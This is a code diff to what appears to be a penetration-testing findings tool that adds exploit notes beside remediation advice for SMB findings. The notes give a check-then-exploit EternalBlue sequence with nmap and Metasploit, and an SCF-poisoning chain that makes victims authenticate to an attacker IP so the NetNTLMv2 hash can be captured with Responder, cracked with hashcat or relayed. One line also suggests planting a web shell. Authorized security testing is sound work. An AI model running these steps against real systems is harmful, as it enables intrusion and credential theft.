@@ -458,7 +458,12 @@ def findings(hosts: list[Host], probes: dict | None = None) -> list[dict]:
                     "on but patched",
                     "Disable SMBv1 entirely (Windows: Remove-WindowsFeature FS-SMB1 / "
                     "registry SMB1=0; Samba: 'server min protocol = SMB2_10').",
-                    ["CWE-1104", "CWE-477"], kind="smbv1"))
+                    ["CWE-1104", "CWE-477"], kind="smbv1",
+                    exploit_note=(
+                        "nmap --script smb-vuln-ms17-010 -p445 <ip>. If VULNERABLE: "
+                        "msf use exploit/windows/smb/ms17_010_eternalblue set RHOSTS "
+                        "<ip>; LHOST <you>; check first, exploit only in ROE."),
+                    depth_tier="t1"))
             # SMB signing is TWO independent flags in the SMB2 NEGOTIATE
             # SecurityMode byte, and conflating them is the difference between
             # "the server can sign if the client asks" and "the server refuses
@@ -883,7 +888,13 @@ def write_proof_finding(ip: str, port: int, share: str, proof: dict,
         "smbclient //<ip>/" + shlex.quote(share) + " -N -c 'put poison.scf; ls'   # then capture "
         "NetNTLM with Responder; or drop a web shell if the share backs a web root",
         "Remove write access for non-admin/anonymous principals; audit share + NTFS "
-        "ACLs.", ["CWE-732", "CWE-276"], kind="writable_share")
+        "ACLs.", ["CWE-732", "CWE-276"], kind="writable_share",
+        exploit_note=(
+            "smbclient //<ip>/<share> -N -c 'put @poisoned.scf; ls'. Content: "
+            "[Shell]\\nCommand=2\\nIconFile=\\\\<your-ip>\\pwn.ico\\n[Taskbar]\\n"
+            "Command=ToggleDesktop. Then responder -I <iface> -A. Capture the "
+            "NetNTLMv2 -> hashcat -m 5600 -> reuse or relay."),
+        depth_tier="t2")
 
 
 # --- proof screenshot -----------------------------------------------------------
